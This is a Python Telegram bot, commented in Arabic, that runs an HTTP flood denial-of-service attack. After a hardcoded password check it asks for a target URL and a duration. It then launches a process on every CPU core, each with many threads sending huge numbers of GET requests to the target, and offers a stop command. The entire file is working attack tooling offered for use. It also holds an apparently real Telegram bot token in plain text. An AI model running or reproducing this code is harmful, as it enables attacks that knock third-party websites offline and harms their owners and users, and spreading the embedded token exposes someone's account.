
import telebot
import threading
import time
import multiprocessing
import requests
from colorama import Fore, Style

# ضع رمز التوكن الخاص بك هنا
TOKEN = '7823594166:AAG5HvvfOnliCBVKu9VsnzmCgrQb68m91go'
bot = telebot.TeleBot(TOKEN)

# متغير لتتبع حالة إيقاف الهجوم
stop_attack_flag = multiprocessing.Value('b', False)

def display_banner(chat_id):
    banner_text = "JUNAI"
    for char in banner_text:
        bot.send_message(chat_id, Fore.GREEN + char + Style.RESET_ALL)
        time.sleep(0.0)

def password_prompt(chat_id):
    bot.send_message(chat_id, "Enter password:")
    bot.register_next_step_handler_by_chat_id(chat_id, check_password)

def check_password(message):
    password = message.text
    if password == "root":
        bot.send_message(message.chat.id, Fore.GREEN + "Correct password! Opening attack menu 0x7F6AD9F14371C6FB9678CA77..." + Style.RESET_ALL)
        start_attack(message.chat.id)
    else:
        bot.send_message(message.chat.id, Fore.RED + "Wrong password! Exiting..." + Style.RESET_ALL)

def send_requests_threaded(target, request_count, thread_count, stop_flag):
    def send_request_thread():
        for _ in range(request_count):
            if stop_flag.value:
                break
            try:
                response = requests.get(target)
            except requests.exceptions.RequestException:
                pass

    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_request_thread)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def show_attack_animation(chat_id):
    bot.send_message(chat_id, "Loading...")

def start_attack(chat_id):
    try:
        msg = bot.send_message(chat_id, "Target URL:")
        bot.register_next_step_handler(msg, get_target_details)
    except Exception as e:
        bot.send_message(chat_id, f"Error: {str(e)}")

def get_target_details(message):
    target = message.text
    request_count = 99999999  # تحديد عدد الطلبات بشكل تلقائي
    attack_power = 8  # تعيين القوة القصوى للهجوم
    thread_count = 16  # تعيين عدد الخيوط لكل نواة إلى الحد الأقصى
    msg = bot.send_message(message.chat.id, "Attack Duration (seconds):")
    bot.register_next_step_handler(msg, execute_attack, target, request_count, attack_power, thread_count)

def execute_attack(message, target, request_count, attack_power, thread_count):
    attack_duration = int(message.text)
    total_cores = multiprocessing.cpu_count()
    cores_to_use = total_cores

    thread_count *= attack_power

    bot.send_message(message.chat.id, f"Sending {request_count} requests to {target} using {cores_to_use} cores and {thread_count} threads per core...")

    show_attack_animation(message.chat.id)
    bot.send_message(message.chat.id, "Start Attack")

    start_time = time.time()
    processes = []

    with stop_attack_flag.get_lock():
        stop_attack_flag.value = False

    while time.time() - start_time < attack_duration:
        if stop_attack_flag.value:
            bot.send_message(message.chat.id, "Attack stopped by user.")
            break
        for i in range(cores_to_use):
            process = multiprocessing.Process(target=send_requests_threaded, args=(target, request_count, thread_count, stop_attack_flag))
            processes.append(process)
            process.start()

        for process in processes:
            process.join()

    if not stop_attack_flag.value:
        end_time = time.time()
        duration = end_time - start_time
        bot.send_message(message.chat.id, f"Attack completed. Total duration: {duration:.2f} seconds.")

    start_attack(message.chat.id)

@bot.message_handler(commands=['start'])
def handle_start(message):
    display_banner(message.chat.id)
    password_prompt(message.chat.id)

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    with stop_attack_flag.get_lock():
        stop_attack_flag.value = True
    bot.send_message(message.chat.id, "Stop command received. Stopping attack...")

def main():
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    main()
